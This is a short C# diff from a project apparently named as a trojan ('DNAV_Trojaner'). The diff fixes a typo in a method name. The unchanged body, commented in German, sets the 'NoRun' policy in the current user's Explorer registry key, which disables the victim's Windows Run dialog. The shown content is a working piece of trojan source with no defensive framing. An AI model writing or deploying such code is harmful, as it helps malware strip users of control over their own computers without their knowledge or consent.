@@ -19,7 +19,7 @@ namespace DNAV_Trojaner
         /// <summary>
         /// Deaktiviert den Ausführen Dialog
         /// </summary>
-        public static void Disbable()
+        public static void Disable()
         {
             RegistryKey run = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
             run.SetValue("NoRun", 0x00000001, RegistryValueKind.DWord);
